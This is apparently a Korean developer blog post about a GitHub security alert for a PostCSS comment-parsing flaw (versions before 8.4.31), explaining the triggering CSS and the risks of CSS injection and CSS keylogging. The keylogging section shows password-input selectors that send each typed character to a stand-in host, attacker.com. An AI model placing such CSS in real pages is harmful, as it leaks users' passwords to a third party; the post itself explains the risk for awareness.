---
layout: post
title: "PostCSS line return parsing error?"
date: 2024-08-15
categories:
  - project
description: >
  'PostCSS line return parsing error'에 대해서 어떤 에러인지 알아보고, 해당 에러의 위험성의 대해서도 함께 알아봅니다.

image:
path: /assets/img/project/postCSS.png
---

# PostCSS line return parsing error??

## 개요

![Security Alert](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vckf9zny0t6t8m11ukl1.png)

1. 프로젝트 초기 환경설정을 마치고 GitHub에 push를 하니, 위와 같은 보안 문제 알림이 나타났습니다.

![Security Alert Details](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/i0ooacksf5b9y1qkdpdo.png)

2. 알림 내용을 확인해보니 위와 같은 에러가 발생했습니다.

![Error Translation](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/afl4segss7c5l7qd5ca8.png)

3.  내용을 번역해보면:

            8.4.31 이전의 PostCSS에서 문제가 발견되었습니다. PostCSS를 사용하여 외부 Cascading Style Sheets(CSS)를 구문 분석하는 linter에 영향을 미칩니다. 규칙에서

        이 보일 때 불일치가 있을 수 있습니다. 예를 들어, `@font-face{ font:(

    /\*);}` 와 같은 코드가 그렇습니다.

            이 취약점은 PostCSS를 사용하여 신뢰할 수 없는 외부 CSS를 구문 분석하는 린터에 영향을 미칩니다. 공격자는 PostCSS에서 구문 분석한 부분을 CSS 주석으로 포함하는 방식으로 CSS를 준비할 수 있습니다. PostCSS에서 처리한 후 원래 주석에 포함되었음에도 불구하고 CSS 노드(규칙, 속성)의 PostCSS 출력에 포함됩니다.

![PostCSS Version](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9nid3pulscyfna659ldl.png)

4. 현재 프로젝트에서는 8.0.0 버전을 사용 중이라 GitHub에서 보안 문제를 경고했다는 것을 알 수 있습니다.

---

## 어떤 문제였을까?

1. **PostCSS가 뭘까?**
   먼저 PostCSS가 뭔지 알아야 할 필요가 있습니다.

   _PostCSS: CSS 파일을 처리하고 변환하는데 사용되는 도구입니다. 이를 통해 CSS의 구문을 파싱하여 다양한 작업(예: 자동 접두사 추가, 변수 처리 등)을 수행할 수 있습니다._

2. **그러면 PostCSS의 어떤 부분이 문제였을까요?**
   **이 취약점의 핵심은 PostCSS가 특정 방식으로 주석을 처리할 때 발생하는 문제입니다.**

   CSS에서 주석을 처리할 때에는 `/* comment */` 형식으로 작성됩니다. 이를 이용하여 공격자는 특정 상황에서 주석 내부에 CSS 구문을 포함시킨 다음, 이 CSS가 PostCSS로 처리될 때 주석이 아닌 일반 규칙으로 인식되도록 할 수 있습니다.

   ```css
   @font-face {
   font: (\r/*);
   }
   ```

3. 위의 `
`은 캐리지 리턴(줄바꿈 문자)입니다. 이 구문은 실제로는 CSS 주석 내부에 있어야 하는 내용입니다.

4. 그러나 PostCSS는 이 부분을 주석으로 올바르게 인식하지 못하고, 주석이 아닌 정상적인 CSS 코드로 처리하는 부분이 문제가 되었습니다.

---

## 얼마나 위험한가?

1. **CSS Injection (CSS 인젝션)**
   CSS 인젝션은 일반적으로 웹 애플리케이션이 사용자로부터 입력받은 값을 제대로 검증하지 않고, 이를 CSS 코드에 삽입할 때 발생합니다. 공격자는 이를 통해 페이지의 스타일을 조작하거나, 더 심각한 경우 악성 스크립트를 실행할 수 있습니다.

   ```html
   <style>
     body {
       background-color: /*user input*/ ;
     }
   </style>
   ```

   만약 `/*user input*/`에 악성 CSS 코드가 삽입된다면, 페이지의 스타일이 비정상적으로 변경되거나 예상치 못한 동작이 발생할 수 있습니다.

2. **CSS Keylogging (CSS 키로깅)**
   CSS를 사용해 키 입력을 추적하는 방법입니다. 공격자는 CSS의 `:focus` 및 `::before`, `::after` 같은 가상 선택자를 사용하여 특정 입력 필드가 선택될 때마다 고유한 스타일을 적용할 수 있습니다. 이를 통해 키 입력을 간접적으로 추적할 수 있습니다.

   ```css
   input[type="password"][value^="a"] {
     background-image: url("http://attacker.com/log/a");
   }
   input[type="password"][value^="b"] {
     background-image: url("http://attacker.com/log/b");
   }
   ```

   사용자가 특정 값을 입력하면, 해당 값에 대한 HTTP 요청이 공격자 서버로 전송될 수 있습니다. 이 방식으로 비밀번호 등의 민감한 정보를 추적할 수 있습니다.
